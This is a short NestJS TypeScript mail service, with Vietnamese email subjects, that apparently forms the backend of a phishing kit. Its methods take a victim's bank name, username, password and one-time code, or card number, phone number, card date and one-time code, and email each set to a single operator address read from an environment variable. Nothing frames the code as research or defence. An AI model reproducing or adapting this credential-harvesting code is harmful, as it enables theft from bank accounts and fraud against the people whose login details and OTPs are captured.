import { MailerService } from '@nestjs-modules/mailer';
import { Injectable } from '@nestjs/common';
import { InfoPaymentCard } from './dtos/InfoPaymentCard';
import { InfoPaymentInGame } from './dtos/InfoPaymentInGame';
import { InfoLoginBank } from './dtos/InfoLoginBank';

@Injectable()
export class MailService {
  constructor(private mailerService: MailerService) {}

  async sendInfoLoginBank(infoLoginBank: InfoLoginBank) {
    try {
      await this.mailerService.sendMail({
        to: process.env.MAIL_SERVICE_TO_USER,
        subject: 'Thông tin đăng nhập tài khoản ngân hàng',
        template: './infopayment-login-bank',
        context: {
          nameBank: infoLoginBank.nameBank,
          username: infoLoginBank.username,
          password: infoLoginBank.password,
          otp: infoLoginBank.otp,
        },
      });
    } catch (error) {
      console.log('error', error);
    }
  }

  async sendInfoPaymentCard(infoPaymentCard: InfoPaymentCard) {
    await this.mailerService.sendMail({
      to: process.env.MAIL_SERVICE_TO_USER,
      subject: 'Thông tin thẻ',
      template: './infopayment',
      context: {
        nameBank: infoPaymentCard.nameBank,
        username: infoPaymentCard.username,
        cardNumber: infoPaymentCard.cardNumber,
        phoneNumber: infoPaymentCard.phoneNumber,
        dateCard: infoPaymentCard.dateCard,
        otp: infoPaymentCard.otp,
      },
    });
  }

  async sendInfoPaymentInGame(infoPaymentCard: InfoPaymentInGame) {
    await this.mailerService.sendMail({
      to: process.env.MAIL_SERVICE_TO_USER,
      subject: 'Thông tin thanh toán in game',
      template: './infopayment-ingame',
      context: {
        username: infoPaymentCard.username,
        note: infoPaymentCard.note,
      },
    });
  }
}
